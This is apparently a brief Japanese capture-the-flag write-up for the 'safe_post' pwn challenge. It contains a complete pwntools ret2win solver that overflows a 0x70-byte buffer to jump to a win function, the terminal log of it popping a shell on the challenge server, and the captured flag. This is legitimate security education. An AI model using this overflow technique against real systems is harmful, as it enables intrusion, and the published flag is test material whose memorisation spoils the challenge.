とりあえずgdbで見るとretは70バイト適当におけば到達するらしい

ret2winでいけそう

```bash
╭─ /Users/mionorn124/Downloads/safe_post(pwn)
╰─ (*'-') < python3 solver.py
[+] Opening connection to 163.44.103.107 on port 25252: Done
[!] Could not populate PLT: No module named 'pkg_resources'
[*] '/Users/mionorn124/Downloads/safe_post/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] Switching to interactive mode
posted: [a] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x12@
$ ls
chal
flag-d34584aa53326dc7226dbf5fc8a4bbe1.txt
start.sh
$ cat flag-d34584aa53326dc7226dbf5fc8a4bbe1.txt
TSGLIVE{compilers_can_sometimes_be_tricky_9d067cb6}$ 
[*] Interrupted
[*] Closed connection to 163.44.103.107 port 25252
╭─ /Users/mionorn124/Downloads/safe_post(pwn)
╰─ (*'-') < cat solver.py

from pwn import *
HOST="163.44.103.107"
PORT=25252
r= remote(HOST, PORT)
elf=ELF("./chal")
win_addr = elf.symbols['win']
payload = b'A' * 0x70 + p64(win_addr)

r.sendlineafter(b'body size> ', b'64')
r.sendlineafter(b'title> ', b'a')
r.sendlineafter(b'body> ', payload)
r.interactive()

```
# flag

```
TSGLIVE{compilers_can_sometimes_be_tricky_9d067cb6}
```